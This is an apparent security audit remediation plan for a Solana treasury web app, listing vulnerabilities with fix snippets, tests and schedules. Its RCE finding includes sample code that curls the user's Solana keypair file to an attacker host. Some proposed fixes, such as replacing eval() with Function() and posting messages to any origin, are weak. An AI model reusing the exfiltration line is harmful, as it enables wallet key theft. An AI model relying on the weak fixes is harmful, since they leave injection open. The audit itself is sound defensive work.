# Keystone Treasury OS - Audit Fixes Implementation Plan

**Prepared:** April 6, 2026  
**Auditor:** Madoc (🦊)  
**Total Issues:** 32+  
**Estimated Effort:** 170-200 person-hours  
**Timeline:** 7-8 weeks with 2-3 engineers

---

## Executive Summary

This document consolidates findings from multiple comprehensive security audits of the Keystone Treasury OS codebase. **32 critical-to-medium severity issues** have been identified across authentication, authorization, business logic, payments, legal compliance, and operations.

### Launch Readiness: 25-45% (depending on fixes)

| Scenario | Effort | Timeline | Risk |
|----------|--------|----------|------|
| **Launch Now** | 0 hours | Immediate | CRITICAL - €30M+ legal liability, complete security compromise |
| **Fix CRITICAL Only** | 50 hours | 1 week | HIGH - Safe but basic functionality issues remain |
| **Fix CRITICAL + HIGH** | 90 hours | 2 weeks | MEDIUM - Production-ready with minor UX gaps |
| **Full Fix (Recommended)** | 170 hours | 7-8 weeks | LOW - Fully compliant and robust |

---

## Phase 1: Emergency Fixes (Week 1) - 50 hours

### MUST FIX BEFORE ANY DEPLOYMENT

These 9 CRITICAL issues represent immediate security threats that would result in complete system compromise if exploited.

#### 1.1 🔴 RCE via Studio Compilation (8 hours)
**File:** `src/app/api/studio/compile-contract/route.ts`  
**Severity:** CRITICAL  
**Issue:** User-supplied Rust code is written to disk and executed via `anchor build` with ZERO validation or sandboxing.

**Attack Scenario:**
```rust
// Attacker submits malicious code
#[cfg(target_os = "linux")]
fn main() {
    std::process::Command::new("curl")
        .arg("http://attacker.com/exfil")
        .arg("--data-binary")
        .arg("@~/.solana/id.json")
        .output()
        .unwrap();
}
```

**Implementation Plan:**
- [ ] **Day 1-2**: Implement cloud compiler option (Solana Playground API)
  ```typescript
  async function compileCloud(files, programName) {
      const solpgUrl = process.env.SOLPG_API_URL || "https://api.solpg.io";
      const res = await fetch(`${solpgUrl}/build`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
              files: Object.entries(files).map(([name, content]) => [`src/${name}`, content]),
              framework: "anchor",
              programName,
          }),
      });
      return await res.json();
  }
  ```
- [ ] Add Docker sandboxing as fallback (if cloud unavailable)
- [ ] Add AST validation before any code execution
- [ ] Implement strict timeout (30 seconds max)
- [ ] Add process kill on timeout exceeded

**Testing:**
- [ ] Verify malicious code cannot escape sandbox
- [ ] Test timeout enforcement
- [ ] Verify cloud compiler integration

---

#### 1.2 🔴 SIWS Nonce Replay Attack (4 hours)
**File:** `src/app/api/auth/siws/route.ts`  
**Severity:** CRITICAL  
**Issue:** Nonce is generated but NEVER validated. Attacker can replay same signed message multiple times within 5-minute window.

**Implementation Plan:**
- [ ] Add Redis/n-memory nonce tracking
  ```typescript
  const usedNonces = new Set<string>();
  
  // Extract nonce from message
  const nonceMatch = message.match(/Nonce:\s*(.+)/);
  const nonce = nonceMatch[1].trim();
  
  // Check if nonce already used
  if (usedNonces.has(nonce)) {
    return NextResponse.json({ error: 'Nonce already used' }, { status: 400 });
  }
  
  usedNonces.add(nonce);
  setTimeout(() => usedNonces.delete(nonce), 5 * 60 * 1000);
  ```
- [ ] Store nonces in Redis for production (with TTL)
- [ ] Add nonce cleanup job

**Testing:**
- [ ] Attempt replay attack - should fail
- [ ] Verify nonce expiry after 5 minutes
- [ ] Test concurrent nonce generation

---

#### 1.3 🔴 Turnkey Silent Failure (1 hour)
**File:** `src/app/api/turnkey/register/route.ts`  
**Severity:** CRITICAL  
**Issue:** When Turnkey credentials are missing, endpoint returns HTTP 200 with FAKE wallet data. Users think wallet was created but it wasn't.

**Implementation Plan:**
- [ ] Replace demo mode with hard failure
  ```typescript
  if (!apiPublicKey || !apiPrivateKey || !organizationId) {
      const missing = [];
      if (!apiPublicKey) missing.push('TURNKEY_API_PUBLIC_KEY');
      if (!apiPrivateKey) missing.push('TURNKEY_API_PRIVATE_KEY');
      if (!organizationId) missing.push('TURNKEY_ORG_ID');
      
      console.error(`[Turnkey] Missing required env vars: ${missing.join(', ')}`);
      return NextResponse.json(
          { 
              error: 'Turnkey wallet service not configured. Contact support.',
              code: 'WALLET_SERVICE_UNAVAILABLE'
          },
          { status: 503 }
      );
  }
  ```

**Testing:**
- [ ] Test with missing env vars - should return 503
- [ ] Test with valid credentials - should create wallet
- [ ] Verify error message is clear

---

#### 1.4 🔴 Liveblocks Vault Eavesdropping (6 hours)
**File:** `src/app/api/liveblocks-auth/route.ts`  
**Severity:** CRITICAL  
**Issue:** User-scoped rooms are validated, but vault-scoped rooms are NOT. Any user can join ANY vault's real-time collaboration room.

**Implementation Plan:**
- [ ] Add vault authorization check
  ```typescript
  if (room.startsWith("vault:")) {
      const vaultAddress = room.slice("vault:".length);
      
      const vaultTeam = await db.query.vaults
          .findFirst({ where: eq(vaults.address, vaultAddress) });
      
      if (!vaultTeam) {
          return NextResponse.json({ error: "Vault not found" }, { status: 404 });
      }
      
      const isMember = await db.query.teamMembers
          .findFirst({
              where: and(
                  eq(teamMembers.teamId, vaultTeam.teamId),
                  eq(teamMembers.userId, userId)
              )
          });
      
      if (!isMember) {
          return NextResponse.json({ error: "Forbidden" }, { status: 403 });
      }
  }
  ```
- [ ] Add team membership lookup
- [ ] Cache membership checks

**Testing:**
- [ ] Try accessing vault room without membership - should 403
- [ ] Verify member can access their vault
- [ ] Test real-time collaboration still works

---

#### 1.5 🔴 Analytics Cache No User Isolation (2 hours)
**File:** `src/app/api/analytics/history/route.ts`  
**Severity:** CRITICAL  
**Issue:** In-memory cache uses only vault address + timeframe, NO user ID. User A queries vault, User B sees cached results.

**Implementation Plan:**
- [ ] Add user ID to cache key
  ```typescript
  const authUser = await getAuthUser(request);
  const cacheKey = `history:${authUser.id}:${address}:${months}`;
  ```
- [ ] Add vault ownership check before cache read
- [ ] Clear cache on vault membership change

**Testing:**
- [ ] User A queries vault - cache populated
- [ ] User B queries same vault - should NOT see A's cached data
- [ ] Verify performance not degraded

---

#### 1.6 🔴 LivePreview Code Injection (6 hours)
**File:** `src/components/studio/LivePreview.tsx`  
**Severity:** CRITICAL  
**Issue:** User code injected into iframe via template string without proper HTML escaping. XSS vulnerability.

**Implementation Plan:**
- [ ] Replace direct injection with postMessage API
  ```typescript
  // In iframe parent
  iframeRef.current.contentWindow.postMessage({
      type: 'EXECUTE_CODE',
      payload: { userCode: appCode }
  }, '*');
  
  // In iframe
  window.addEventListener('message', async (event) => {
      if (event.origin !== window.location.origin) return;
      const { type, payload } = event.data;
      if (type === 'EXECUTE_CODE') {
          // Execute code safely
      }
  });
  ```
- [ ] Add origin validation
- [ ] Replace eval() with Function() constructor
- [ ] Add content security policy

**Testing:**
- [ ] Attempt code injection - should fail
- [ ] Verify mini-apps still render correctly
- [ ] Test sandbox isolation

---

#### 1.7 🔴 JWT Hardcoded Secret (0.5 hours)
**File:** `src/lib/auth-utils.ts`  
**Severity:** CRITICAL  
**Issue:** JWT_SECRET has hardcoded fallback value.

**Implementation Plan:**
- [ ] Remove fallback, require env var
  ```typescript
  const secret = process.env.JWT_SECRET;
  if (!secret) throw new Error('JWT_SECRET must be configured');
  return new TextEncoder().encode(secret);
  ```

**Testing:**
- [ ] Test without JWT_SECRET - should throw
- [ ] Test with JWT_SECRET - should work

---

#### 1.8 🔴 Webhook Signature Bypass (1 hour)
**File:** `src/app/api/webhooks/lemon-squeezy/route.ts`  
**Severity:** CRITICAL  
**Issue:** Signature verification skipped if env var missing.

**Implementation Plan:**
- [ ] Require webhook secret
  ```typescript
  if (!process.env.LEMON_SQUEEZY_WEBHOOK_SECRET) {
      throw new Error('LEMON_SQUEEZY_WEBHOOK_SECRET not configured');
  }
  ```

---

#### 1.9 🔴 Learn Endpoints No Authentication (3 hours)
**File:** `src/app/api/learn/log-input/route.ts`  
**Severity:** CRITICAL  
**Issue:** Bearer token extracted but NEVER validated. Anyone can submit training data.

**Implementation Plan:**
- [ ] Add JWT validation middleware
- [ ] Track user association with logged inputs
- [ ] Add rate limiting per user

**Testing:**
- [ ] Request without token - should 401
- [ ] Request with invalid token - should 401
- [ ] Request with valid token - should work

---

### Phase 1 Deliverables Checklist

- [ ] All 9 CRITICAL issues fixed
- [ ] Security tests written and passing
- [ ] Code review completed
- [ ] Security audit sign-off

---

## Phase 2: High-Priority Security & Business Logic (Week 2) - 40 hours

### 2.1 🔴 OAuth Race Condition (2 hours)
**File:** `src/app/api/auth/exchange-session/route.ts`  
**Issue:** Session can be assigned to wrong user under race conditions.

**Fix:**
- Add atomic session creation
- Add state validation
- Add CSRF protection

---

### 2.2 🔴 DCA Bot Auto-Creates Users (3 hours)
**File:** `src/app/api/solana/dca-bot/route.ts`  
**Issue:** DCA bot auto-creates users without proper tier checks.

**Fix:**
- Require existing user
- Check tier limits before DCA creation
- Add audit logging

---

### 2.3 🔴 Marketplace Purchase No Verification (4 hours)
**File:** `src/app/api/studio/marketplace/purchase/route.ts`  
**Issue:** Records purchases without on-chain verification. Fake purchases possible.

**Fix:**
- Verify on-chain transaction before recording
- Check payment confirmation
- Add purchase validation webhook

---

### 2.4 🟠 Runs No Isolation (1 hour)
**File:** `src/app/api/runs/route.ts`  
**Issue:** ANY user sees ALL runs from platform.

**Fix:**
```typescript
// Add user filter
.where(eq(runs.userId, authUser.id))
```

---

### 2.5 🟠 Vault Activity Public (2 hours)
**File:** `src/app/api/vault/[address]/activity/route.ts`  
**Issue:** Anyone can query any vault's activity.

**Fix:**
- Check vault ownership
- Return 403 if not member

---

### 2.6 🟠 Vault Tier Bypass (4 hours)
**File:** `src/components/treasury/VaultSelector.tsx`  
**Issue:** Users can create unlimited vaults, bypassing tier limits.

**Fix:**
- Check vault count against tier limit
- Add server-side validation
- Show upgrade prompt

---

### 2.7 🟠 Vaults Not Persisted (6 hours)
**File:** `src/components/treasury/VaultSelector.tsx`  
**Issue:** Vaults created but never persisted to database.

**Fix:**
- Add vault creation API
- Store in database
- Sync with UI state

---

### 2.8 🟠 RPC Proxy No Rate Limiting (4 hours)
**File:** `src/app/api/solana/rpc/route.ts`  
**Issue:** No rate limiting on RPC calls.

**Fix:**
- Add Upstash Redis rate limiter
- 100 requests/hour per user
- Add caching for common calls

---

### 2.9 🟠 PromptChat API Injection (3 hours)
**File:** `src/components/studio/PromptChat.tsx`  
**Issue:** User input sent to API without validation.

**Fix:**
- Add input sanitization
- Validate prompt length
- Block suspicious patterns

---

### 2.10 🟠 WalletManager Weak Credentials (4 hours)
**File:** `src/components/studio/WalletManager.tsx`  
**Issue:** WebAuthn credentials not validated.

**Fix:**
- Add client-side validation
- Add server-side attestation verification
- Use @simplewebauthn library

---

### 2.11 🟠 Dashboard Real-time Updates (5 hours)
**File:** `src/app/app/page.tsx`  
**Issue:** Data stale without page reload.

**Fix:**
- Add WebSocket connection
- Or 30-second polling
- Show "last updated" timestamp

---

### 2.12 🟠 N+1 Database Queries (6 hours)
**Files:** Multiple endpoints  
**Issue:** Sequential queries instead of batched.

**Fix:**
- Use Promise.all() for parallel queries
- Add JOIN statements where appropriate
- Add query optimization

---

## Phase 3: Legal & Compliance (Week 3) - 28 hours

### 3.1 🟡 No Legal Pages (4 hours)
**Missing:** `/app/legal/*`  
**Issue:** No privacy policy, terms of service, cookie policy.

**Fix:**
- Create privacy policy page
- Create terms of service page
- Create cookie consent banner
- Add to footer/navigation

---

### 3.2 🟡 No GDPR Endpoints (8 hours)
**Missing:** `/api/user/delete`, `/api/user/export`  
**Issue:** Cannot comply with GDPR data requests. €20M fine risk.

**Fix:**
```typescript
// DELETE /api/user/delete
export async function DELETE(req: Request) {
    const user = await getAuthUser(req);
    
    // Delete user data
    await db.delete(users).where(eq(users.id, user.id));
    await db.delete(vaults).where(eq(vaults.userId, user.id));
    await db.delete(team_members).where(eq(team_members.userId, user.id));
    // ... all related data
    
    // Notify third parties
    await notifyDataDeletion(user.id);
    
    return NextResponse.json({ success: true });
}

// GET /api/user/export
export async function GET(req: Request) {
    const user = await getAuthUser(req);
    
    // Export all user data
    const data = await exportUserData(user.id);
    
    return NextResponse.json(data);
}
```

---

### 3.3 🟡 DCA Shared Keypair (8 hours)
**File:** `src/app/api/cron/dca-execute/route.ts`  
**Issue:** All DCA bots share same keypair. Compromise = all bots stolen.

**Fix:**
- Generate unique keypair per bot
- Store encrypted in database
- Add key rotation

---

### 3.4 🟡 Team Members Public (2 hours)
**File:** `src/app/api/team/[id]/members/route.ts`  
**Issue:** Team member list visible without authorization.

**Fix:**
- Check if requester is team member
- Return 403 if not authorized

---

### 3.5 🟡 Approval Notifications Missing (4 hours)
**Issue:** Notifications table exists but never sent.

**Fix:**
- Add notification service
- Send on approval events
- Add email notifications
- Add in-app notifications

---

### 3.6 🟡 Onboarding No Vault (8 hours)
**File:** `src/app/app/onboarding/page.tsx`  
**Issue:** Onboarding completes without creating vault = empty dashboard.

**Fix:**
- Require vault creation
- Add "skip for now" with warning
- Guide user through first vault

---

## Phase 4: Infrastructure & Operations (Week 4) - 20 hours

### 4.1 🟡 No Rate Limiting (6 hours)
**Issue:** All public endpoints exposed.

**Fix:**
- Add Upstash Redis rate limiter
- Per-user limits
- Per-IP limits
- Different limits per tier

---

### 4.2 🟡 No /api/health (2 hours)
**Missing:** Health check endpoint  
**Issue:** No uptime monitoring possible.

**Fix:**
```typescript
// GET /api/health
export async function GET() {
    // Check database
    await db.query.users.limit(1);
    
    // Check Redis
    await redis.ping();
    
    // Check external services
    const services = await checkExternalServices();
    
    return NextResponse.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        services
    });
}
```

---

### 4.3 🟡 Email Fire-and-Forget (4 hours)
**File:** `src/app/app/onboarding/page.tsx`  
**Issue:** Email errors silently ignored.

**Fix:**
- Add email queue
- Retry failed emails
- Show error to user
- Log failures

---

### 4.4 🟡 Missing Error Boundaries (4 hours)
**Issue:** No React error boundaries. Page crashes = white screen.

**Fix:**
- Add ErrorBoundary component
- Wrap all pages
- Add fallback UI
- Add error reporting

---

### 4.5 🟡 Inconsistent Error Handling (4 hours)
**Issue:** Different error formats across endpoints.

**Fix:**
- Standardize to `{ error: { code: string, message: string } }`
- Create error utilities
- Update all endpoints

---

## Phase 5: Testing & Launch Prep (Week 5) - 40 hours

### Security Testing
- [ ] Penetration testing
- [ ] Replay attack testing
- [ ] RCE attempt testing
- [ ] Access control testing
- [ ] Rate limit testing

### Functional Testing
- [ ] End-to-end user flows
- [ ] Vault creation flow
- [ ] DCA bot flow
- [ ] Marketplace purchase flow
- [ ] Team management flow

### Load Testing
- [ ] API load tests
- [ ] Database performance
- [ ] RPC proxy load
- [ ] WebSocket load

### Compliance Testing
- [ ] GDPR deletion works
- [ ] GDPR export works
- [ ] Legal pages visible
- [ ] Cookie consent working

### Documentation
- [ ] Security runbook
- [ ] Incident response plan
- [ ] API documentation
- [ ] Deployment guide

---

## Implementation Priorities

### P0 - Do Today (8.5 hours)
1. JWT hardcoding fix (0.5h)
2. SIWS nonce validation (4h)
3. Webhook signature bypass (1h)
4. Runs isolation (1h)
5. Vault activity auth (2h)

### P1 - This Week (41.5 hours)
All remaining CRITICAL issues

### P2 - Week 2 (40 hours)
All HIGH severity issues

### P3 - Week 3 (28 hours)
Legal/compliance issues

### P4 - Week 4 (20 hours)
Infrastructure issues

### P5 - Week 5 (40 hours)
Testing and launch prep

---

## File Changes Summary

### Critical Files to Modify

| File | Issue | Effort |
|------|-------|--------|
| `src/app/api/studio/compile-contract/route.ts` | RCE | 8h |
| `src/app/api/auth/siws/route.ts` | Replay attack | 4h |
| `src/app/api/turnkey/register/route.ts` | Silent failure | 1h |
| `src/app/api/liveblocks-auth/route.ts` | Eavesdropping | 6h |
| `src/app/api/analytics/history/route.ts` | Cache isolation | 2h |
| `src/components/studio/LivePreview.tsx` | Code injection | 6h |
| `src/lib/auth-utils.ts` | JWT hardcoding | 0.5h |
| `src/app/api/webhooks/lemon-squeezy/route.ts` | Webhook bypass | 1h |
| `src/app/api/learn/log-input/route.ts` | No auth | 3h |
| `src/app/api/auth/exchange-session/route.ts` | OAuth race | 2h |
| `src/app/api/solana/dca-bot/route.ts` | Auto-create | 3h |
| `src/app/api/studio/marketplace/purchase/route.ts` | No verification | 4h |
| `src/app/api/runs/route.ts` | No isolation | 1h |
| `src/app/api/vault/[address]/activity/route.ts` | Public access | 2h |
| `src/components/treasury/VaultSelector.tsx` | Tier bypass | 4h |
| `src/app/api/solana/rpc/route.ts` | No rate limiting | 4h |
| `src/components/studio/PromptChat.tsx` | Injection | 3h |
| `src/components/studio/WalletManager.tsx` | Weak auth | 4h |
| `src/app/app/page.tsx` | No real-time | 5h |
| `src/app/api/cron/dca-execute/route.ts` | Shared keypair | 8h |
| `src/app/api/user/delete.ts` | Missing | 4h |
| `src/app/api/user/export.ts` | Missing | 4h |
| `src/app/app/legal/*.tsx` | Missing | 4h |
| `src/app/api/health/route.ts` | Missing | 2h |

---

## Dependencies to Add

```bash
# Rate limiting
npm install @upstash/ratelimit @upstash/redis

# WebAuthn
npm install @simplewebauthn/server @simplewebauthn/browser

# Security
npm install helmet express-rate-limit

# Testing
npm install @playwright/test
```

---

## Monitoring & Alerting

### Metrics to Track
- Rate limit hits
- Failed auth attempts
- RCE attempts (blocked)
- Replay attacks (blocked)
- Error rates
- Response times

### Alerts
- Any 500 errors
- Rate limit exceeded
- Failed security checks
- Database connection failures
- External API failures

---

## Success Criteria

### Phase 1 Complete
- [ ] All CRITICAL issues fixed
- [ ] Security tests passing
- [ ] No hardcoded secrets
- [ ] All endpoints authenticated

### Phase 2 Complete
- [ ] All HIGH issues fixed
- [ ] Business logic secured
- [ ] Rate limiting active
- [ ] Proper error handling

### Phase 3 Complete
- [ ] GDPR compliant
- [ ] Legal pages live
- [ ] DCA keypairs isolated

### Phase 4 Complete
- [ ] Rate limiting everywhere
- [ ] Health checks working
- [ ] Error boundaries in place

### Phase 5 Complete
- [ ] All tests passing
- [ ] Security audit passed
- [ ] Documentation complete
- [ ] Ready for launch

---

## Risk Assessment

| Risk | Likelihood | Impact | Mitigation |
|------|------------|--------|------------|
| RCE Exploitation | Medium | Critical | Fix immediately, use cloud compiler |
| Data Breach | High | Critical | Fix auth issues, add encryption |
| GDPR Fine | Medium | Critical | Add compliance features |
| DDoS Attack | Medium | High | Add rate limiting |
| Launch Delay | Medium | Medium | Prioritize P0 issues |

---

**Total Estimated Effort: 170 person-hours**  
**Recommended Team: 2-3 engineers**  
**Timeline: 7-8 weeks**  
**Ready for Launch: Week 8**

---

*This plan consolidates findings from: AUDIT-19-ISSUES.md, AUDIT-SUMMARY.md, FINAL-COMPREHENSIVE-AUDIT.md, KEYSTONE-COMPLETE-DETAILED-AUDIT.md, KEYSTONE-EXTENDED-AUDIT-32-ISSUES.md, and REAL-AUDIT-FINDINGS.md*
